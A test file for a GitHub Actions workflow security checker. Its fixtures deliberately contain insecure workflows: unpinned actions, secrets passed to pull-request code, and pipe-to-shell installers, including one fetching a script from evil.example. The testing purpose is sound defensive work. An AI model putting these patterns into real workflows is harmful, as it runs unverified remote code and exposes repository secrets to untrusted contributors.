import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { checkGithubWorkflowSecurity } from './check-github-workflow-security';

function writeFixture(root: string, relativePath: string, content: string) {
  const filePath = join(root, relativePath);
  mkdirSync(dirname(filePath), { recursive: true });
  writeFileSync(filePath, `${dedent(content)}\n`);
}

function dedent(content: string): string {
  const lines = content.replace(/^\n/, '').replace(/\s+$/, '').split('\n');
  const indents = lines
    .filter((line) => line.trim())
    .map((line) => line.match(/^ */)?.[0].length ?? 0);
  const minIndent = Math.min(...indents);
  return lines.map((line) => line.slice(minIndent)).join('\n');
}

function messages(root: string): string {
  return checkGithubWorkflowSecurity(root)
    .map((violation) => violation.message)
    .join('\n');
}

describe('checkGithubWorkflowSecurity', () => {
  let root: string;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'github-workflow-security-'));
  });

  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('rejects mutable external action refs', () => {
    writeFixture(
      root,
      '.github/workflows/bad.yml',
      `
      name: Bad
      on: pull_request
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
      `,
    );

    expect(messages(root)).toContain(
      'actions/checkout@v4 must be pinned to a 40-character SHA',
    );
  });

  it('allows external action refs pinned to immutable SHAs', () => {
    writeFixture(
      root,
      '.github/workflows/good.yml',
      `
      name: Good
      on: pull_request
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects local actions that receive secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-secret.yml',
      `
      name: Bad local secret
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/claude-review
              with:
                oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('allows local actions without secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/good-local.yml',
      `
      name: Good local
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/lint
              with:
                mode: strict
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('allows trusted-base local actions to receive secrets in pull_request workflows', () => {
    writeFixture(
      root,
      '.github/workflows/good-trusted-local-secret.yml',
      `
      name: Good trusted local secret
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.trusted-actions/.github/actions/claude-review
              with:
                oauth_token: \${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects local pull_request actions that inherit workflow-level secret env', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-workflow-env.yml',
      `
      name: Bad local inherited workflow env
      on: pull_request
      env:
        TOKEN: \${{ secrets.TEST_TOKEN }}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: ./.github/actions/review
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('rejects local pull_request actions that inherit job-level secret env', () => {
    writeFixture(
      root,
      '.github/workflows/bad-local-job-env.yml',
      `
      name: Bad local inherited job env
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          env:
            TOKEN: \${{ secrets.TEST_TOKEN }}
          steps:
            - uses: ./.github/actions/review
      `,
    );

    expect(messages(root)).toContain(
      'local action receives secrets in a pull_request workflow',
    );
  });

  it('rejects workflow_run jobs that expose secrets to pull_request head code', () => {
    writeFixture(
      root,
      '.github/workflows/bad-workflow-run.yml',
      `
      name: Bad workflow run
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        e2e:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: echo "$TEST_SEED_SECRET"
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(messages(root)).toContain(
      'workflow_run exposes secrets while checking out head_sha',
    );
  });

  it('allows workflow_run jobs that skip pull_request runs before secret-backed jobs', () => {
    writeFixture(
      root,
      '.github/workflows/good-workflow-run-pr-skip.yml',
      `
      name: Good workflow run PR skip
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        check-changes:
          runs-on: ubuntu-latest
          outputs:
            run-mobile-e2e: \${{ steps.analyze.outputs.run-mobile-e2e }}
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - name: Analyze changed file types
              id: analyze
              run: |
                if [ "\${{ github.event_name }}" = "workflow_run" ] && [ "\${{ github.event.workflow_run.event }}" = "pull_request" ]; then
                  echo "run-mobile-e2e=false" >> "$GITHUB_OUTPUT"
                  exit 0
                fi
        e2e:
          needs: check-changes
          if: needs.check-changes.outputs.run-mobile-e2e == 'true'
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test:e2e
              env:
                TEST_SEED_SECRET: \${{ secrets.TEST_SEED_SECRET }}
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('allows workflow_run jobs that do not expose secrets', () => {
    writeFixture(
      root,
      '.github/workflows/good-workflow-run.yml',
      `
      name: Good workflow run
      on:
        workflow_run:
          workflows: ["CI"]
      jobs:
        inspect:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
              with:
                ref: \${{ github.event.workflow_run.head_sha }}
            - run: pnpm test
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });

  it('rejects curl pipe-to-shell installers without checksum verification', () => {
    writeFixture(
      root,
      '.github/workflows/bad-installer.yml',
      `
      name: Bad installer
      on: workflow_dispatch
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - run: curl -Ls https://get.maestro.mobile.dev | bash
      `,
    );

    expect(messages(root)).toContain(
      'pipe-to-shell installer must be replaced or checksum-verified',
    );
  });

  it('rejects pipe-to-shell installers even when another artifact is checksum verified', () => {
    writeFixture(
      root,
      '.github/workflows/bad-installer-unrelated-checksum.yml',
      `
      name: Bad installer unrelated checksum
      on: workflow_dispatch
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - run: |
                curl -Ls https://evil.example/install.sh | bash
                curl -fsSLO https://example.test/tool.tar.gz
                curl -fsSLO https://example.test/checksums.txt
                grep " tool.tar.gz$" checksums.txt | sha256sum -c -
      `,
    );

    expect(messages(root)).toContain(
      'pipe-to-shell installer must be replaced or checksum-verified',
    );
  });

  it('allows curl downloads that are checksum verified before install', () => {
    writeFixture(
      root,
      '.github/workflows/good-installer.yml',
      `
      name: Good installer
      on: workflow_dispatch
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - run: |
                curl -fsSLO https://example.test/tool.tar.gz
                curl -fsSLO https://example.test/checksums.txt
                grep " tool.tar.gz$" checksums.txt | sha256sum -c -
                sudo tar -xzf tool.tar.gz -C /usr/local/bin tool
      `,
    );

    expect(checkGithubWorkflowSecurity(root)).toEqual([]);
  });
});
